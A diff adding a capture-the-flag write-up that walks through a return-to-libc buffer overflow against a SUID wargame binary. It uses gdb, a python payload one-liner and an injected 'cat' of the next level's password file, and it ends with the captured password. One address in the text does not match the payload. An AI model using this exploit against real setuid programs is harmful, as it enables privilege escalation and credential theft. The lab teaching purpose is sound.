@@ -1,1 +1,84 @@
-something something return from libc attack
+Another level another SUID binary:
+
+	$ ls -l
+	total 8
+	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+
+We use gdb to take a look at the asm instructions again:
+
+	$ gdb level1
+	(gdb) disas main
+	(...)
+	0x0804848d <+13>:	mov    %eax,(%esp)
+	0x08048490 <+16>:	call   0x8048340 <gets@plt>
+	0x08048495 <+21>:	leave
+	0x08048496 <+22>:	ret
+	End of assembler dump.
+
+Here we can see that a call to the gets function is performed.
+This function reads input into a buffer until it encounters either a
+returning newline or EOF. It does not perform any checks for a buffer
+overrun, which we will exploit in a so-called 'return from libc attack'.
+
+We give gets enough input to overrun the buffer and overwrite the following
+memory, which contains the memory address of the next instruction.
+
+!!!(add some note on how the process stack looks)!!!
+
+Our goal is to overwrite the following call with a call to system, with the
+parameter "cat /home/user/level2/.pass".
+
+To do this, we first place the parameter inside the memory by saving it to an
+environmental variable:
+
+	(gdb) quit
+	$ export FROG="cat /home/user/level2/.pass"
+
+Now we use gdb to note down the memory location of the system function...
+
+	$ gdb level1
+	(gdb) b main
+	(gdb) run
+	(gdb) p system
+	$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+... and our environmental variable. For the latter, we simply dump memory
+starting from the stack pointer $esp until we find our environment:
+
+	(gdb) x/500s $esp
+	(...)
+	0xbfffffa0:	 "FROG=cat /home/user/level2/.pass"
+
+For convenience, we use python to feed a string of custom length to the input:
+
+	(gdb) quit
+	$ python -c "print('a'*100)" | ./level1
+	Segmentation fault (core dumped)
+
+With some trial and error, we find that we need to skip 75 bytes to then
+overwrite the following instruction, at which point we get the following
+error:
+	$ python -c "print('a'*76)" | ./level1
+	Illegal instruction (core dumped)
+
+Next, we write the address of the system function, then 4 bytes of padding
+for the return statement, and the address of our parameter in that order,
+all in little endian:
+
+	$ python -c "print('a'*76 + '\x60\xb0\xe6\xb7' + '\x00\x00\x00\x00' + 
+	'\xa0\xff\xff\xbf')" | ./level1
+	sh: 1: /user/level2/.pass: not found
+	Segmentation fault (core dumped)
+
+As with gdb some memory locations may be shifted, when we run without it,
+we may have to adjust some addresses slightly. In this case we can see that
+the parameter is off by 9 bytes, so we change 0xbfffffa0 to 0xbffffe97:
+
+	$ python -c "print('a'*76 + '\x60\xb0\xe6\xb7' + '\x00\x00\x00\x00' + 
+	'\x97\xff\xff\xbf')" | ./level1
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+...and get our flag!
+
+	$ su level2
+	Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
